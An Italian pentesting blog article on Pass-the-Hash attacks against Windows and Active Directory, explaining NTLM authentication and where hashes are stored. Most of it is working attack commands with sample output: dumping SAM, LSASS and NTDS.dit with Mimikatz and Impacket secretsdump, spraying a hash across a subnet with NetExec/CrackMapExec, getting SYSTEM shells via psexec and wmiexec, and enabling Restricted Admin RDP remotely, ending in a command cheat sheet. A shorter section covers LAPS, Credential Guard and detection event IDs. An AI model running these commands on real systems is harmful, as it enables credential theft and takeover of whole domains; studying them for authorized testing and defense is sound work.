---
title: 'Pass-the-Hash Windows: attacco, funzionamento e accesso senza password'
slug: pass-the-hash
description: 'Scopri il Pass-the-Hash (PtH) su Windows: come funziona, come sfruttare hash NTLM per ottenere accesso senza password e tecniche reali di lateral movement.'
image: '/ChatGPT Image 26 feb 2026, 12_26_40.webp'
draft: false
date: 2026-02-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - privesc-windows
  - ntlm
featured: true
---

# Pass-the-Hash (PtH): L'Attacco Che Non Ha Bisogno della Tua Password

Con un solo hash puoi compromettere un intero dominio Active Directory in pochi minuti. Nessun brute force, nessun cracking: se hai l’hash, hai già accesso.

Pass-the-Hash è la tecnica chiave per il lateral movement in ambienti Windows: usi direttamente l’hash NTLM come credenziale e ti autentichi ovunque quell’utente abbia accesso.

## Cos'è Pass-the-Hash — Per Chi Parte da Zero

Quando accedi a un computer Windows con la tua password, il sistema non la salva in chiaro. La trasforma in un **hash NTLM** — una stringa esadecimale di 32 caratteri che rappresenta la tua password in forma irreversibile. Fin qui tutto bene: è un meccanismo di sicurezza. Il problema è che il protocollo di autenticazione NTLM (usato da [SMB](https://hackita.it/articoli/smb), [WinRM](https://hackita.it/articoli/porta-5985-winrm), [RDP](https://hackita.it/articoli/porta-3389-rdp) e altri servizi Windows) non richiede la password in chiaro per autenticarsi — **accetta direttamente l'hash**. Questo significa che se un attaccante riesce a ottenere il tuo hash NTLM, può usarlo per accedere a qualsiasi servizio dove il tuo account è autorizzato, senza mai dover crackare la password.

In pratica: rubo l'hash di un Domain Admin → lo uso per connettermi a ogni macchina del dominio. Niente brute force, niente [Hashcat](https://hackita.it/articoli/hashcat), niente attesa. L'hash **è** la credenziale.

## Come Funziona l'Autenticazione NTLM

```
Client                           Server (SMB, WinRM, RDP NLA...)
┌──────────────┐                ┌──────────────────────────┐
│              │── negotiate ──►│                          │
│              │◄── challenge ──│  "Ecco un numero random" │
│              │                │                          │
│  NTLM hash  │                │                          │
│  della pwd   │── response ──►│  Verifica la response    │
│  + challenge │                │  usando l'hash salvato   │
│  = response  │                │                          │
│              │◄── success ───│  "OK, sei autenticato"   │
└──────────────┘                └──────────────────────────┘
```

Il punto chiave è nel terzo passaggio: il client prende l'hash NTLM della password e lo combina con il challenge del server per creare la response. Il server fa lo stesso calcolo con l'hash che ha salvato nel proprio database (SAM locale o [Active Directory](https://hackita.it/articoli/active-directory) NTDS.dit). Se corrispondono → accesso concesso. **In nessun momento la password in chiaro viene trasmessa o necessaria.**

Questo è il motivo per cui PtH funziona: se hai l'hash, puoi calcolare la response corretta senza conoscere la password.

## Dove Si Trovano gli Hash NTLM

Prima di passare un hash, devi ottenerne uno. Ecco tutti i posti dove gli hash NTLM vivono e come estrarli.

### 1. Database SAM — Hash Locali

Ogni macchina Windows salva gli hash delle password locali nel database **SAM** (Security Account Manager). Per leggerlo servono privilegi di Administrator o SYSTEM.

```powershell
# Da una sessione con privilegi admin (Evil-WinRM, shell Meterpreter, RDP)
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system
```

Scarica i file e usa [Impacket](https://hackita.it/articoli/impacket) per estrarre gli hash:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

Il formato è `username:RID:LM_hash:NTLM_hash`. L'hash che usi per PtH è quello dopo il secondo `:` — in questo caso `32ed87bdb5fdc5e9cba88547376818d4` per Administrator.

L'hash LM (`aad3b435b51404eeaad3b435b51404ee`) è vuoto — significa che LM hash è disabilitato (comportamento default da Windows Vista). Per PtH va incluso comunque nel formato `LM:NTLM`.

### 2. LSASS — Hash dalla Memoria

LSASS (Local Security Authority Subsystem Service) è il processo Windows che gestisce le autenticazioni. Ogni utente che fa login su una macchina lascia il proprio hash NTLM nella memoria di LSASS. [Mimikatz](https://hackita.it/articoli/mimikatz) è lo strumento standard per estrarlo.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

```
Authentication Id : 0 ; 999999
Session           : Interactive from 1
User Name         : j.rossi
Domain            : CORP
NTLM              : 5f4dcc3b5aa765d61d8327deb882cf99
```

Questo funziona anche da remoto con [Evil-WinRM](https://hackita.it/articoli/porta-5985-winrm):

```bash
evil-winrm -i 10.10.10.40 -u administrator -p 'Corp2025!'
*Evil-WinRM* PS> upload mimikatz.exe C:\Windows\Temp\m.exe
*Evil-WinRM* PS> C:\Windows\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 3. NTDS.dit — Tutti gli Hash del Dominio

Il file **NTDS.dit** è il database di AD: contiene l'hash NTLM di **ogni utente del dominio**. Estrarlo è l'obiettivo finale di un Domain Compromise.

```bash
# Da remoto con secretsdump (richiede Domain Admin o DCSync privileges)
impacket-secretsdump CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
krbtgt:502:aad3b435b51404ee:f3bc61e97fb14d1c30ac3d1b51c2345e:::
j.rossi:1103:aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
svc_sql:1105:aad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
```

Per la tecnica [DCSync](https://hackita.it/articoli/dcsync) completa — l'hash di `krbtgt` permette il Golden Ticket.

### 4. Responder — Hash dalla Rete

[Responder](https://hackita.it/articoli/responder) cattura hash NTLMv2 dalla rete avvelenando le risposte LLMNR/NBT-NS. Questi hash **non** sono direttamente utilizzabili per PtH (sono challenge-response, non hash puri), ma possono essere craccati con [Hashcat](https://hackita.it/articoli/hashcat) per ottenere la password → dalla password calcoli l'hash NTLM puro → PtH.

```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### 5. Altre Fonti di Hash

* **Dump SAM da backup** — file `C:\Windows\Repair\SAM` e `SYSTEM`
* **Volume Shadow Copy** — `vssadmin create shadow /for=C:` → copia SAM/NTDS.dit dalla shadow
* **[Kerberoasting](https://hackita.it/articoli/kerberoasting)** → hash dei service account → crack → password → hash NTLM
* **NTDS.dit da backup** — backup del Domain Controller

## Pass-the-Hash in Pratica — Tool per Tool

### NetExec — Il Coltellino Svizzero

[NetExec](https://hackita.it/articoli/netexec) (NXC) è lo strumento più versatile per PtH. Supporta SMB, WinRM, RDP, LDAP, SSH, MSSQL.

```bash
# PtH via SMB — verifica credenziali
nxc smb 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

```
SMB  10.10.10.40  445  DC-01  [+] CORP\administrator:32ed87bdb5fdc5e9cba88547376818d4 (Pwn3d!)
```

`(Pwn3d!)` → l'hash è valido E l'utente è admin locale sulla macchina.

```bash
# PtH via WinRM
nxc winrm 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

```bash
# PtH su un'intera subnet — trova TUTTE le macchine dove l'hash funziona
nxc smb 10.10.10.0/24 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4' --continue-on-success
```

```
SMB  10.10.10.40  445  DC-01     [+] CORP\administrator (Pwn3d!)
SMB  10.10.10.41  445  WEB-01    [+] CORP\administrator (Pwn3d!)
SMB  10.10.10.42  445  DB-01     [+] CORP\administrator (Pwn3d!)
SMB  10.10.10.43  445  FILE-01   [+] CORP\administrator (Pwn3d!)
SMB  10.10.10.44  445  DEV-01    [-] CORP\administrator STATUS_LOGON_FAILURE
```

4 macchine su 5 compromesse con un singolo hash. Questa è la potenza del PtH. Volendo si puà usare anche [crackmapexec](https://hackita.it/articoli/crackmapexec)

```bash
# Esegui un comando su tutte le macchine compromesse
crackmapexec smb 10.10.10.0/24 -u administrator -H 'HASH' -x "whoami && hostname"

# Dump SAM da remoto su tutte le macchine
crackmapexec smb 10.10.10.0/24 -u administrator -H 'HASH' --sam
```

```bash
# Dump LSA secrets (credenziali di servizio, auto-logon, cache)
crackmapexec smb 10.10.10.40 -u administrator -H 'HASH' --lsa

# Dump NTDS.dit dal Domain Controller
crackmapexec smb 10.10.10.40 -u administrator -H 'HASH' --ntds
```

### Evil-WinRM — Shell Interattiva via PtH

```bash
evil-winrm -i 10.10.10.40 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
corp\administrator
```

Shell PowerShell completa. Da qui: [Mimikatz](https://hackita.it/articoli/mimikatz), [BloodHound](https://hackita.it/articoli/active-directory), dump SAM, [DCSync](https://hackita.it/articoli/dcsync).

### Impacket — La Suite Completa

```bash
# PsExec — shell SYSTEM via SMB
impacket-psexec CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
```

```
[*] Requesting shares on 10.10.10.40.....
[*] Found writable share ADMIN$
[*] Uploading file...
Microsoft Windows [Version 10.0.20348.2340]
C:\Windows\system32> whoami
nt authority\system
```

PsExec ti dà una shell **SYSTEM** — il livello di privilegio più alto su Windows.

```bash
# WMIExec — più stealth di PsExec (non scrive file su disco)
impacket-wmiexec CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'

# SMBExec — alternativa a PsExec
impacket-smbexec CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'

# ATExec — esecuzione via Windows Task Scheduler
impacket-atexec CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' "whoami"

# DCSync — dump tutti gli hash del dominio
impacket-secretsdump CORP/administrator@10.10.10.40 -hashes 'aad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' -just-dc-ntlm
```

### Mimikatz — PtH Nativo Windows

```
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:powershell.exe
```

Apre una nuova finestra PowerShell autenticata come `CORP\administrator` — da qui puoi accedere a qualsiasi risorsa di rete dove quell'utente ha permessi.

```powershell
# Dalla PowerShell con identità administrator
dir \\DC-01\C$
Enter-PSSession DC-01
```

### xfreerdp — RDP via PtH

```bash
# Richiede Restricted Admin Mode abilitato sul target
xfreerdp /v:10.10.10.40 /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4 /d:CORP
```

PtH su [RDP](https://hackita.it/articoli/porta-3389-rdp) funziona solo se Restricted Admin Mode è attivo. Per abilitarlo da remoto (se hai già accesso):

```bash
crackmapexec smb 10.10.10.40 -u administrator -H 'HASH' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f'
```

## Il Flusso Completo di un Attacco PtH

Ecco come si svolge un attacco Pass-the-Hash reale in un penetration test Active Directory:

```
1. ACCESSO INIZIALE
   Phishing → shell su workstation utente
   └── oppure: exploit servizio esposto, credenziali trovate

2. PRIMO HASH
   Mimikatz su workstation → hash utente locale + cache di dominio
   └── oppure: dump SAM locale → hash Administrator locale

3. LATERAL MOVEMENT
   CrackMapExec + hash su intera subnet → trova macchine dove l'hash funziona
   └── l'hash admin locale è spesso lo stesso su tutte le workstation (no LAPS)

4. PRIVILEGE ESCALATION
   Su ogni nuova macchina → Mimikatz → nuovi hash
   └── cerca hash di Domain Admin, service account privilegiati

5. DOMAIN COMPROMISE
   Hash Domain Admin → secretsdump → DCSync → NTDS.dit
   └── hash di krbtgt → Golden Ticket → accesso permanente
```

## Password Riutilizzate — Il Moltiplicatore del PtH

Il PtH è devastante in ambienti dove:

* L'**Administrator locale** ha la stessa password su tutte le macchine (no [LAPS](https://hackita.it/articoli/active-directory))
* I **service account** usano la stessa password ovunque
* Gli **utenti** riutilizzano la password del dominio su servizi locali

Un singolo hash Administrator locale → accesso a 50, 100, 500 macchine. Questo è il motivo per cui Microsoft ha creato LAPS (Local Administrator Password Solution): password locali uniche per ogni macchina.

## Protocolli Vulnerabili a PtH

| Protocollo | Porta                                                                                                           | PtH funziona?             | Tool                      |
| ---------- | --------------------------------------------------------------------------------------------------------------- | ------------------------- | ------------------------- |
| **SMB**    | [445](https://hackita.it/articoli/smb)                                                                          | Sì (sempre)               | CME, Impacket, Mimikatz   |
| **WinRM**  | [5985](https://hackita.it/articoli/porta-5985-winrm)/[5986](https://hackita.it/articoli/porta-5986-winrm-https) | Sì                        | Evil-WinRM, CME           |
| **RDP**    | [3389](https://hackita.it/articoli/porta-3389-rdp)                                                              | Solo con Restricted Admin | xfreerdp                  |
| **LDAP**   | 389/636                                                                                                         | Sì                        | CME, ldapsearch           |
| **MSSQL**  | 1433                                                                                                            | Sì                        | CME, Impacket-mssqlclient |
| **WMI**    | 135                                                                                                             | Sì                        | Impacket-wmiexec          |
| **DCOM**   | 135                                                                                                             | Sì                        | Impacket-dcomexec         |

Protocolli **non** vulnerabili a PtH: Kerberos (usa ticket, non hash direttamente — ma esiste Pass-the-Ticket e Overpass-the-Hash), SSH (a meno di configurazione PAM specifica).

## Contromisure e Detection

### Come difendersi

* **LAPS** — password admin locali uniche per ogni macchina. L'hash di una macchina non funziona sulle altre
* **Credential Guard** — protegge LSASS dalla lettura degli hash in memoria. Mimikatz non può estrarre hash
* **Protected Users group** — gli utenti in questo gruppo non usano NTLM, solo Kerberos
* **Disabilita NTLM** dove possibile — forza Kerberos (`Network security: Restrict NTLM`)
* **Admin tiering** — il Domain Admin non fa mai login sulle workstation, solo sui DC
* **Privileged Access Workstations (PAW)** — workstation dedicate per gli admin, isolate dalla rete
* **Network segmentation** — le workstation non possono raggiungere direttamente i server
* **Just-in-Time (JIT) admin** — privilegi admin concessi temporaneamente, poi revocati

### Come rilevare PtH

| Event ID          | Log      | Cosa indica                                          |
| ----------------- | -------- | ---------------------------------------------------- |
| **4624** (Type 3) | Security | Login di rete — PtH via SMB/WinRM                    |
| **4624** (Type 9) | Security | Login con credenziali esplicite — Mimikatz pth       |
| **4648**          | Security | Login con credenziali esplicite fornite — PsExec     |
| **4672**          | Security | Privilegi speciali assegnati — login admin           |
| **4776**          | Security | NTLM authentication — conferma uso NTLM non Kerberos |

Pattern sospetto: login Type 3 da un IP insolito + NTLM auth (non Kerberos) + account admin = probabile PtH.

```powershell
# Query PowerShell per trovare login sospetti
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
  Where-Object {$_.Properties[8].Value -eq 3 -and $_.Properties[10].Value -eq 'NTLM'} |
  Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='Source';E={$_.Properties[18].Value}}
```

## FAQ — Domande Frequenti su Pass-the-Hash

**Pass-the-Hash funziona con hash NTLMv2?**
No. Gli hash NTLMv2 catturati da [Responder](https://hackita.it/articoli/responder) sono challenge-response, non hash puri. Devi prima crackarli con [Hashcat](https://hackita.it/articoli/hashcat) (mode 5600) per ottenere la password, poi calcolare l'hash NTLM puro.

**Posso fare PtH con un hash di account locale verso un'altra macchina?**
Sì, se l'account locale ha lo stesso username e password hash sull'altra macchina. Questo è il caso classico dell'Administrator locale con password uguale su tutte le workstation.

**PtH funziona su Linux/macOS?**
No. PtH è specifico del protocollo NTLM di Windows. Su Linux/macOS si usano tecniche diverse (chiavi SSH rubate, token OAuth).

**Qual è la differenza tra PtH e Pass-the-Ticket?**
PtH usa hash NTLM con il protocollo NTLM. Pass-the-Ticket usa ticket Kerberos (TGT/TGS) con il protocollo Kerberos. In ambienti dove NTLM è disabilitato, PtT è l'alternativa.

**Come faccio a sapere se LAPS è attivo?**

```bash
crackmapexec ldap DC-01 -u user -H HASH -M laps
```

Se LAPS è attivo, le password locali sono uniche → PtH con hash locale funziona solo su quella macchina specifica.

## Cheat Sheet Finale — Pass-the-Hash

| Azione               | Comando                                                                                               |
| -------------------- | ----------------------------------------------------------------------------------------------------- |
| **Ottenere hash**    |                                                                                                       |
| SAM dump locale      | `reg save HKLM\SAM sam` + `reg save HKLM\SYSTEM system` → `secretsdump -sam sam -system system LOCAL` |
| LSASS (Mimikatz)     | `sekurlsa::logonpasswords`                                                                            |
| DCSync               | `impacket-secretsdump CORP/admin@DC -hashes LM:NTLM`                                                  |
| NTDS.dit             | `crackmapexec smb DC -u admin -H HASH --ntds`                                                         |
| **Usare hash (PtH)** |                                                                                                       |
| CME SMB              | `crackmapexec smb target -u user -H 'NTLM_HASH'`                                                      |
| CME WinRM            | `crackmapexec winrm target -u user -H 'NTLM_HASH'`                                                    |
| CME spray subnet     | `crackmapexec smb 10.0.0.0/24 -u user -H 'HASH' --continue-on-success`                                |
| CME exec command     | `crackmapexec smb target -u user -H 'HASH' -x "command"`                                              |
| CME dump SAM         | `crackmapexec smb target -u user -H 'HASH' --sam`                                                     |
| Evil-WinRM           | `evil-winrm -i target -u user -H 'NTLM_HASH'`                                                         |
| PsExec               | `impacket-psexec DOMAIN/user@target -hashes 'LM:NTLM'`                                                |
| WMIExec              | `impacket-wmiexec DOMAIN/user@target -hashes 'LM:NTLM'`                                               |
| SMBExec              | `impacket-smbexec DOMAIN/user@target -hashes 'LM:NTLM'`                                               |
| ATExec               | `impacket-atexec DOMAIN/user@target -hashes 'LM:NTLM' "cmd"`                                          |
| Mimikatz pth         | `sekurlsa::pth /user:X /domain:X /ntlm:HASH /run:cmd`                                                 |
| RDP                  | `xfreerdp /v:target /u:user /pth:HASH /d:DOMAIN`                                                      |
| SecretsDump          | `impacket-secretsdump DOMAIN/user@target -hashes 'LM:NTLM'`                                           |

***

Riferimento: Microsoft NTLM documentation, Mimikatz wiki, OSCP/OSEP methodology, MITRE ATT\&CK T1550.002. Uso esclusivo in ambienti autorizzati.

> Pass-the-Hash è la tecnica che separa un pentester junior da un professionista. Per padroneggiare il lateral movement in Active Directory: [formazione 1:1 HackIta](https://hackita.it/formazione) — o se vuoi capire quanto il tuo dominio è vulnerabile: [penetration test Active Directory](https://hackita.it/servizi).
